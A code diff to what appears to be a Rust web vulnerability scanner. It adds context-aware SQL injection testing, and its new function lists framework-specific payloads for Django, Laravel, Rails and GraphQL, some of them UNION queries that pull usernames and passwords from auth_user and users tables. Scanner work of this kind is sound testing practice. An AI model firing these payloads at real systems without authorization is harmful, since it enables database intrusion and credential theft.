@@ -13,7 +13,7 @@
 use crate::http_client::{HttpClient, HttpResponse};
 use crate::payloads;
 use crate::scanners::parameter_filter::{ParameterFilter, ScannerType};
-use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
+use crate::types::{Confidence, EndpointType, ParameterSource, ScanConfig, ScanContext, Severity, Vulnerability};
 use crate::vulnerability::VulnerabilityDetector;
 use anyhow::Result;
 use futures::stream::{self, StreamExt};
@@ -94,6 +94,7 @@ impl EnhancedSqliScanner {
         base_url: &str,
         parameter: &str,
         config: &ScanConfig,
+        context: Option<&ScanContext>,
     ) -> Result<(Vec<Vulnerability>, usize)> {
         // ============================================================
         // MANDATORY AUTHORIZATION CHECK - CANNOT BE BYPASSED
@@ -106,15 +107,30 @@ impl EnhancedSqliScanner {
             return Ok((Vec::new(), 0));
         }
 
+        // Skip static content endpoints
+        if let Some(ctx) = context {
+            if matches!(ctx.endpoint_type, EndpointType::StaticContent) {
+                debug!("[SQLi] Skipping static content endpoint");
+                return Ok((Vec::new(), 0));
+            }
+        }
+
         // Smart parameter filtering - skip boolean flags and framework internals
         if ParameterFilter::should_skip_parameter(parameter, ScannerType::SQLi) {
             debug!("[SQLi] Skipping boolean/framework parameter: {}", parameter);
             return Ok((Vec::new(), 0));
         }
 
-        info!("Testing parameter '{}' for SQL injection (unified scanner, priority: {})",
+        info!("Testing parameter '{}' for SQL injection (unified scanner, priority: {}{})",
               parameter,
-              ParameterFilter::get_parameter_priority(parameter));
+              ParameterFilter::get_parameter_priority(parameter),
+              if let Some(ctx) = context {
+                  format!(", framework: {:?}, source: {:?}",
+                          ctx.framework.as_deref().unwrap_or("Unknown"),
+                          ctx.parameter_source)
+              } else {
+                  String::new()
+              });
 
         let mut all_vulnerabilities = Vec::new();
         let mut total_tests = 0;
@@ -142,9 +158,15 @@ impl EnhancedSqliScanner {
             db_type, injection_context
         );
 
+        // Apply context-aware prioritization
+        let priority_boost = self.get_context_priority_boost(context);
+        if priority_boost > 0 {
+            info!("[SQLi] Context-aware priority boost: +{}", priority_boost);
+        }
+
         // Technique 1: Error-based detection (fast, high confidence)
         let (error_vulns, error_tests) = self
-            .scan_error_based(base_url, parameter, &baseline, &db_type, &injection_context, config)
+            .scan_error_based(base_url, parameter, &baseline, &db_type, &injection_context, config, context)
             .await?;
         total_tests += error_tests;
         all_vulnerabilities.extend(error_vulns);
@@ -489,17 +511,24 @@ impl EnhancedSqliScanner {
         parameter: &str,
         baseline: &HttpResponse,
         db_type: &DatabaseType,
-        context: &InjectionContext,
+        injection_context: &InjectionContext,
         config: &ScanConfig,
+        scan_context: Option<&ScanContext>,
     ) -> Result<(Vec<Vulnerability>, usize)> {
         debug!("Testing error-based SQLi");
 
         let payloads = if config.scan_mode.as_str() == "fast" {
             // Fast mode: minimal payloads
-            self.get_context_aware_payloads(db_type, context)
+            self.get_context_aware_payloads(db_type, injection_context)
         } else {
             // Normal/thorough mode: comprehensive payloads
-            let mut all_payloads = self.get_context_aware_payloads(db_type, context);
+            let mut all_payloads = self.get_context_aware_payloads(db_type, injection_context);
+
+            // Add framework-specific payloads if context is available
+            if let Some(ctx) = scan_context {
+                all_payloads.extend(self.get_framework_specific_payloads(ctx, injection_context));
+            }
+
             all_payloads.extend(payloads::get_sqli_payloads(config.scan_mode.as_str()));
             all_payloads
         };
@@ -2272,6 +2301,128 @@ impl EnhancedSqliScanner {
         None
     }
 
+    /// Get priority boost based on scan context
+    fn get_context_priority_boost(&self, context: Option<&ScanContext>) -> u32 {
+        let mut boost = 0;
+
+        if let Some(ctx) = context {
+            // Higher priority for URL query string parameters (more likely to be vulnerable)
+            if matches!(ctx.parameter_source, ParameterSource::UrlQueryString) {
+                boost += 2;
+            }
+
+            // Boost for API endpoints
+            if matches!(ctx.endpoint_type, EndpointType::RestApi | EndpointType::GraphQlApi) {
+                boost += 1;
+            }
+        }
+
+        boost
+    }
+
+    /// Get framework-specific SQL injection payloads
+    fn get_framework_specific_payloads(&self, context: &ScanContext, injection_context: &InjectionContext) -> Vec<String> {
+        let mut payloads = Vec::new();
+
+        // Django ORM bypass patterns
+        if let Some(ref framework) = context.framework {
+            match framework.as_str() {
+                "Django" => {
+                    debug!("[SQLi] Using Django ORM bypass patterns");
+                    match injection_context {
+                        InjectionContext::Numeric => {
+                            payloads.extend(vec![
+                                // Django ORM filter bypass
+                                " OR 1=1--".to_string(),
+                                " UNION SELECT NULL,NULL,NULL--".to_string(),
+                                // Django raw SQL injection
+                                " AND 1=(SELECT COUNT(*) FROM django_session)--".to_string(),
+                            ]);
+                        }
+                        _ => {
+                            payloads.extend(vec![
+                                // Django ORM string injection
+                                "' OR '1'='1' --".to_string(),
+                                "' OR 1=1--".to_string(),
+                                // Django template injection via SQL
+                                "' UNION SELECT NULL,NULL,'{{7*7}}'--".to_string(),
+                                // Django-specific table access
+                                "' UNION SELECT username,password,NULL FROM auth_user--".to_string(),
+                            ]);
+                        }
+                    }
+                }
+                "Laravel" => {
+                    debug!("[SQLi] Using Laravel Eloquent bypass patterns");
+                    match injection_context {
+                        InjectionContext::Numeric => {
+                            payloads.extend(vec![
+                                // Eloquent whereRaw bypass
+                                " OR 1=1) --".to_string(),
+                                " UNION SELECT NULL,NULL,NULL,NULL--".to_string(),
+                                // Laravel common tables
+                                " AND 1=(SELECT COUNT(*) FROM users)--".to_string(),
+                            ]);
+                        }
+                        _ => {
+                            payloads.extend(vec![
+                                // Eloquent string injection
+                                "' OR '1'='1') --".to_string(),
+                                "' OR 1=1) --".to_string(),
+                                // Laravel migrations table
+                                "' UNION SELECT NULL,migration,batch,NULL FROM migrations--".to_string(),
+                                // Laravel users table
+                                "' UNION SELECT id,name,email,password FROM users--".to_string(),
+                            ]);
+                        }
+                    }
+                }
+                "Ruby on Rails" | "Rails" => {
+                    debug!("[SQLi] Using Rails ActiveRecord bypass patterns");
+                    match injection_context {
+                        InjectionContext::Numeric => {
+                            payloads.extend(vec![
+                                " OR 1=1--".to_string(),
+                                " AND 1=(SELECT COUNT(*) FROM schema_migrations)--".to_string(),
+                            ]);
+                        }
+                        _ => {
+                            payloads.extend(vec![
+                                "' OR '1'='1'--".to_string(),
+                                "' UNION SELECT NULL,NULL,version,NULL FROM schema_migrations--".to_string(),
+                            ]);
+                        }
+                    }
+                }
+                _ => {}
+            }
+        }
+
+        // GraphQL-specific SQL injection patterns
+        if context.is_graphql {
+            debug!("[SQLi] Using GraphQL-specific SQLi patterns");
+            match injection_context {
+                InjectionContext::Numeric => {
+                    payloads.extend(vec![
+                        " OR 1=1) }--".to_string(),
+                        " UNION SELECT NULL,NULL) }--".to_string(),
+                    ]);
+                }
+                _ => {
+                    payloads.extend(vec![
+                        // GraphQL query breaking + SQL injection
+                        "' OR '1'='1') }--".to_string(),
+                        "\\\" OR \\\"1\\\"=\\\"1\\\") }--".to_string(),
+                        // GraphQL batching SQLi
+                        "' UNION SELECT NULL,NULL) } { __typename }--".to_string(),
+                    ]);
+                }
+            }
+        }
+
+        payloads
+    }
+
     /// Check if vulnerability is new (thread-safe deduplication)
     fn is_new_vulnerability(&self, vuln: &Vulnerability) -> bool {
         let signature = format!("{}:{}:{}", vuln.url, vuln.parameter.as_ref().unwrap_or(&String::new()), vuln.vuln_type);
@@ -2346,5 +2497,88 @@ mod tests {
 
         let sim = scanner.calculate_content_similarity("abc", "xyz");
         assert!(sim < 0.5);
+    }
+
+    #[test]
+    fn test_context_priority_boost() {
+        let client = Arc::new(HttpClient::new(10, 3).unwrap());
+        let scanner = EnhancedSqliScanner::new(client);
+
+        // Test with URL query string parameter (should get priority boost)
+        let context_high_priority = ScanContext {
+            parameter_source: ParameterSource::UrlQueryString,
+            endpoint_type: EndpointType::RestApi,
+            detected_tech: vec![],
+            framework: None,
+            server: None,
+            other_parameters: vec![],
+            is_json_api: false,
+            is_graphql: false,
+            form_fields: vec![],
+            content_type: None,
+        };
+        let boost = scanner.get_context_priority_boost(Some(&context_high_priority));
+        assert_eq!(boost, 3); // 2 for UrlQueryString + 1 for RestApi
+
+        // Test with no context
+        let boost_none = scanner.get_context_priority_boost(None);
+        assert_eq!(boost_none, 0);
+    }
+
+    #[test]
+    fn test_framework_specific_payloads() {
+        let client = Arc::new(HttpClient::new(10, 3).unwrap());
+        let scanner = EnhancedSqliScanner::new(client);
+
+        // Test Django framework
+        let django_context = ScanContext {
+            parameter_source: ParameterSource::UrlQueryString,
+            endpoint_type: EndpointType::RestApi,
+            detected_tech: vec!["Django".to_string()],
+            framework: Some("Django".to_string()),
+            server: None,
+            other_parameters: vec![],
+            is_json_api: false,
+            is_graphql: false,
+            form_fields: vec![],
+            content_type: None,
+        };
+        let payloads = scanner.get_framework_specific_payloads(&django_context, &InjectionContext::String);
+        assert!(!payloads.is_empty());
+        assert!(payloads.iter().any(|p| p.contains("auth_user")));
+
+        // Test Laravel framework
+        let laravel_context = ScanContext {
+            parameter_source: ParameterSource::UrlQueryString,
+            endpoint_type: EndpointType::RestApi,
+            detected_tech: vec!["Laravel".to_string()],
+            framework: Some("Laravel".to_string()),
+            server: None,
+            other_parameters: vec![],
+            is_json_api: false,
+            is_graphql: false,
+            form_fields: vec![],
+            content_type: None,
+        };
+        let payloads = scanner.get_framework_specific_payloads(&laravel_context, &InjectionContext::String);
+        assert!(!payloads.is_empty());
+        assert!(payloads.iter().any(|p| p.contains("migrations")));
+
+        // Test GraphQL
+        let graphql_context = ScanContext {
+            parameter_source: ParameterSource::GraphQL,
+            endpoint_type: EndpointType::GraphQlApi,
+            detected_tech: vec![],
+            framework: None,
+            server: None,
+            other_parameters: vec![],
+            is_json_api: false,
+            is_graphql: true,
+            form_fields: vec![],
+            content_type: None,
+        };
+        let payloads = scanner.get_framework_specific_payloads(&graphql_context, &InjectionContext::String);
+        assert!(!payloads.is_empty());
+        assert!(payloads.iter().any(|p| p.contains("__typename")));
     }
 }
